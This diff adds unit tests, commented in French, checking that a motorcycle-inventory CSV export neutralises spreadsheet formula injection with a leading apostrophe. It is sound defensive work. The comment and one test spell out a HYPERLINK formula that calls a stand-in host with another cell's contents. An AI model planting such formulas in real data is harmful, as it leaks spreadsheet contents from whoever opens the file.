@@ -87,6 +87,47 @@ describe("motosEnCsv", () => {
     expect(lignes(csv)[1]).toContain('"Rouge; ""vif"""');
   });
 
+  /**
+   * **Une cellule n'est pas une formule, et le tableur ne le sait pas.**
+   *
+   * Excel et LibreOffice évaluent toute cellule qui commence par `=`, `+`, `-`
+   * ou `@`. Une couleur saisie `=HYPERLINK("http://ailleurs/"&A1;"ok")` devient
+   * donc une formule *chez celui qui ouvre le fichier*, pas chez celui qui l'a
+   * tapée — et ce qu'elle emporte, c'est le contenu des autres cellules.
+   *
+   * Ce n'est pas une menace de passant : il faut un compte pour saisir une
+   * moto. C'est justement ce qui la rend intéressante — un gérant écrit la
+   * couleur, le responsable ouvre l'export. Le fichier franchit une frontière
+   * de confiance, et c'est le seul endroit du produit où cela arrive.
+   *
+   * L'apostrophe de tête est la parade usuelle : elle dit au tableur « ceci est
+   * du texte ». Elle se voit dans la cellule, et c'est le prix — payé seulement
+   * par les valeurs qui n'avaient aucune raison de commencer ainsi.
+   */
+  it("neutralise une valeur qui commence comme une formule", () => {
+    const formules = ["=1+1", "+1", "-1", "@SUM(A1)"];
+    for (const texte of formules) {
+      const csv = motosEnCsv([moto({ couleur: texte })], nomMarque, nomModele);
+      const cellules = lignes(csv)[1].split(SEPARATEUR);
+      expect(cellules[EN_TETE_EXPORT.indexOf("Couleur")], texte).toBe(`'${texte}`);
+    }
+  });
+
+  it("protège aussi une formule qui contient le séparateur", () => {
+    const csv = motosEnCsv(
+      [moto({ couleur: '=HYPERLINK("http://ailleurs/";"ok")' })],
+      nomMarque,
+      nomModele,
+    );
+    expect(lignes(csv)[1]).toContain(`"'=HYPERLINK(""http://ailleurs/"";""ok"")"`);
+  });
+
+  it("ne touche pas à une valeur ordinaire", () => {
+    const csv = motosEnCsv([moto({ couleur: "Rouge" })], nomMarque, nomModele);
+    const cellules = lignes(csv)[1].split(SEPARATEUR);
+    expect(cellules[EN_TETE_EXPORT.indexOf("Couleur")]).toBe("Rouge");
+  });
+
   it("laisse la cellule vide quand le modèle n’a pas été saisi", () => {
     const csv = motosEnCsv([moto({ modeleId: "" })], nomMarque, nomModele);
     const cellules = lignes(csv)[1].split(SEPARATEUR);
